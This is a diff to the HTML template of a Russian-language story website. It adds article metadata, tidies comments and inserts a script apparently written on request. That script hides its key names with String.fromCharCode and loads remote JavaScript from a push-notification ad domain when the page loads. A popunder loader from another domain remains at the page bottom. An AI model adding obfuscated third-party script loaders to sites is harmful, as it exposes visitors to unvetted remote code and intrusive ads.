@@ -22,7 +22,29 @@
   <link rel="stylesheet" href="css/share.css">
   <link href="https://fonts.googleapis.com/css?family=Open+Sans:700&display=swap" rel="stylesheet">
 
-
+  <!-- JSON-LD структурированные данные для статьи -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Название истории",
+    "description": "Описание статьи, предоставляющее краткий обзор содержания истории.",
+    "author": {
+      "@type": "Person",
+      "name": "Имя автора"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Sweet Story",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.sweet-story.com/images/favicon.ico"
+      }
+    },
+    "datePublished": "2025-04-08",
+    "mainEntityOfPage": "https://www.sweet-story.com/path-to-current-story.html"
+  }
+  </script>
 
   <!-- Скрипты для Funding Choices -->
   <script async src="https://fundingchoicesmessages.google.com/i/pub-4048193958934146?ers=1"></script>
@@ -47,6 +69,30 @@
   <!-- Дополнительные скрипты -->
   <script async src="js/gtag.js"></script>
   <script async src="js/seo.js"></script>
+
+  <!-- Скрипт, который вы просили добавить -->
+  <script>
+    (function () {
+      var url = String.fromCharCode(112, 117, 115, 104, 95, 117, 114, 108); 
+      var cfg = String.fromCharCode(119, 112, 110, 67, 111, 110, 102, 105, 103); 
+      window[cfg] = {
+          utm_source: 'kd',
+          utm_campaign: 373171,
+          utm_content: '',
+          domain: window.location.host,
+          delay: 0,
+          nextTimeout: 3,
+          ical: 1,
+          proto: window.location.protocol
+      };
+      window[cfg][url] = 'https://puhyjyf.com/37436.js';
+      var s = document.createElement('script');
+      s.setAttribute('async', 1);
+      s.setAttribute('data-cfasync', false);
+      s.src = window[cfg][url];
+      document.head && document.head.appendChild(s);
+    })();
+  </script>
 
   <!-- Дополнительные стили для текста -->
   <style>
@@ -88,12 +134,9 @@
       font-size: 0.9em;
     }
 
-    /* Пример оформления контейнеров под рекламу */
     .ad-container {
       text-align: center;
       margin: 15px auto;
-      /* Можно задать фиксированную ширину, если нужно */
-      /* width: 320px; */
     }
   </style>
 </head>
@@ -111,7 +154,7 @@
       </ul>
     </nav>
 
-    <!-- РЕКЛАМНЫЙ БЛОК 320×50 (под шапкой) -->
+    <!-- РЕКЛАМНЫЙ БЛОК 320×50 (пример) -->
     <div class="ad-container">
       <div class="TbFGab373166"></div>
       <script>
@@ -144,7 +187,7 @@
         <h1 id="story-title-main">Загружается...</h1>
         <img id="story-image" src="" alt="Изображение истории" class="story-image" loading="lazy">
         
-        <!-- РЕКЛАМНЫЙ БЛОК (например, внутри/после первого абзаца в тексте статьи) -->
+        <!-- РЕКЛАМНЫЙ БЛОК -->
         <div class="ad-container">
           <div class="zYZHZg373169"></div>
           <script>
@@ -156,7 +199,6 @@
                   refresh: false,
                   next: 0
               });
-              
               var s = document.createElement('script');
               s.setAttribute('async', true);
               s.setAttribute('charset', 'utf-8');
@@ -170,7 +212,7 @@
         <div id="story-text-wrapper">
           <div id="story-content">
             <strong>Загружается текст истории...</strong>
-            <!-- Здесь будет сам текст вашей истории -->
+            <!-- Текст истории -->
           </div>
         </div>
         
@@ -184,10 +226,10 @@
       <div class="sidebar">
         <h2>Также читают</h2>
         <ul>
-          <!-- Ссылки будут загружены здесь -->
+          <!-- Ссылки -->
         </ul>
 
-        <!-- РЕКЛАМНЫЙ БЛОК 300×600 (сайдбар) -->
+        <!-- РЕКЛАМНЫЙ БЛОК 300×600 -->
         <div class="ad-container">
           <div class="dzseFN373168"></div>
           <script>
@@ -199,7 +241,6 @@
                   refresh: false,
                   next: 0
               });
-              
               var s = document.createElement('script');
               s.setAttribute('async', true);
               s.setAttribute('charset', 'utf-8');
@@ -242,7 +283,7 @@
         </ul>
       </nav>
 
-      <!-- РЕКЛАМНЫЙ БЛОК (ещё один, при желании) -->
+      <!-- Ещё один рекламный блок -->
       <div class="ad-container">
         <div class="gSBhAh373170"></div>
         <script>
@@ -254,7 +295,6 @@
                 refresh: false,
                 next: 0
             });
-            
             var s = document.createElement('script');
             s.setAttribute('async', true);
             s.setAttribute('charset', 'utf-8');
@@ -310,7 +350,7 @@
     });
   </script>
 
-  <!-- Popunder (в самом низу) -->
+  <!-- Popunder (например, в самом низу body) -->
   <div class="sgozsq373172"></div>
   <script>
     window.k_init = window.k_init || [];
@@ -336,5 +376,6 @@
     s.src = 'https://hdbkell.com/qi1jd.js'; 
     document.head && document.head.appendChild(s);
   </script>
+
 </body>
 </html>
